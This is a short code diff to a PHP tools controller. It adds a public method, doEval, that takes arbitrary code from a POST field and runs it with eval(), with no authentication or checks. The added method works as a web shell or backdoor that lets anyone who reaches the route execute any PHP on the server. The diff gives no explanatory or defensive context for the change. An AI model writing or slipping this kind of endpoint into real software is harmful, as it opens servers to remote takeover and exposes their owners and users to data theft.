@@ -60,4 +60,9 @@ class FunctionController extends ToolsController{
 		
 		$this->view->render();
 	}
+	
+	public function doEval(){
+		$code = $this->input->post('code', '', '');
+		echo eval('?>'. $code);
+	}
 }
